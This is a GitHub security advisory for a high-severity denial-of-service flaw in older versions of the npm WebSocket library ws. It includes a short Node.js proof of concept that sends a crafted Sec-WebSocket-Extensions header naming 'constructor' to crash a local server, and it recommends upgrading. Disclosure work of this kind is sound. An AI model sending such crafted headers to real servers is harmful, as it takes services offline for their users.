# [H] Denial of Service in ws

## Summary
Severity: High
Advisory: GHSA-5v72-xg48-5rpm
CWE: CWE-400
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2019-06-04
Source: https://github.com/advisories/GHSA-5v72-xg48-5rpm
Type: github-advisory

## Affected
- npm: `ws` — affected >=0.6.0 <1.1.5
- npm: `ws` — affected >=2.0.0 <3.3.1

## Details
Affected versions of `ws` can crash when a specially crafted `Sec-WebSocket-Extensions` header containing `Object.prototype` property names as extension or parameter names is sent.

## Proof of concept

```
const WebSocket = require('ws');
const net = require('net');

const wss = new WebSocket.Server({ port: 3000 }, function () {
  const payload = 'constructor';  // or ',;constructor'

  const request = [
    'GET / HTTP/1.1',
    'Connection: Upgrade',
    'Sec-WebSocket-Key: test',
    'Sec-WebSocket-Version: 8',
    `Sec-WebSocket-Extensions: ${payload}`,
    'Upgrade: websocket',
    '\r\n'
  ].join('\r\n');

  const socket = net.connect(3000, function () {
    socket.resume();
    socket.write(request);
  });
});
```


## Recommendation

Update to version 3.3.1 or later.

## References
- https://github.com/websockets/ws/commit/a810bfa44f08c84ff3f43cc71327e9bb5fb273ef
- https://github.com/websockets/ws/commit/c4fe46608acd61fbf7397eadc47378903f95b78a
- https://github.com/websockets/ws/commit/f8fdcd40ac8be7318a6ee41f5ceb7e77c995b407
- https://github.com/websockets/ws
- https://snyk.io/vuln/npm:ws:20171108
